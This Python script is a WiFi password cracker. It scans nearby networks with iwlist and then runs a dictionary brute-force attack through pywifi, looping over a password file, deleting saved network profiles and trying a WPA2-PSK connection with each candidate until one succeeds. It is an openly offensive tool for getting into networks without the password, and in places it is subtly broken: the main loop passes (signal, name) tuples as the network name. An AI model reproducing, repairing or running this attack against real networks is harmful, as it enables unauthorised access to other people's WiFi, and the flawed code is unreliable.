import re
import subprocess
import pywifi
import time
from pywifi import const
 
# WiFi scanner
def wifi_scan():
    # use the iwlist command to scan for wifi networks
    iwlist_output = subprocess.check_output(['sudo', 'iwlist', 'wlo1', 'scan'], universal_newlines=True)
    # extract the results from the output
    results = re.findall(r'ESSID:"(.+)"\s+.*Signal level=(-\d+) dBm', iwlist_output)
    # format the results
    wifi_name_list = [(100 + int(signal), name) for name, signal in results]
    # sort by signal strength
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    # print the results
    print('\rScan Completed\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('No.', 'Strength', 'wifi name'))
    num = 0
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # return wifi list
    return wifi_name_list

    # import os 
    # os.system("nmcli dev wifi > list.txt")
    # l = []
    # import time 

    # with open("list.txt") as w:
    #     x = w.readlines()
    #     for i in x:
    #         print(i)
    #         y = i.split()
    #         l.append(y[1])
    # return l
 
# WIFI cracking function
def wifi_password_crack(wifi_name):
    # password dictionary file
    wifi_dic_path = "_temp/password.txt"
    with open(wifi_dic_path, 'r') as f:
        # loop through all combinations
        for pwd in f:
            # strip of the trailing new line character
            pwd = pwd.strip('\n')
            # initialise wifi object
            wifi = pywifi.PyWiFi()
            # initialise interface using the first one
            interface = wifi.interfaces()[0]
            # disconnect all other connections
            interface.disconnect()
            # waiting for all disconnection to complete
            while interface.status() == 4:
                # break from the loop once all disconnection complete
                pass
            # initialise profile
            profile = pywifi.Profile()
            # wifi name
            profile.ssid = wifi_name
            # need verification
            profile.auth = const.AUTH_ALG_OPEN
            # wifi default encryption algorithm
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi password
            profile.key = pwd
            # remove all wifi connection profiles
            interface.remove_all_network_profiles()
            # set new wifi connection profile
            tmp_profile = interface.add_network_profile(profile)
            # attempting new connection
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # when interface connection status is 4, it succeeds
                # greater than 1.5s normally means the connection failed
                # normal successful connection is completed in 1.5s 
                # increase the timer to increase the accuracy at the cost of slower speed
                if interface.status() == 4:
                    print(f'\rConnection Succeeded. Password - {pwd}')
                    exit(0)
                else:
                    print(f'\rTrying with {pwd}', end='')
# main execution function
def main():
    # exit signal
    exit_flag = 0
    # target number
    l = wifi_scan()
    for i in l:
        wifi_password_crack(i)
main()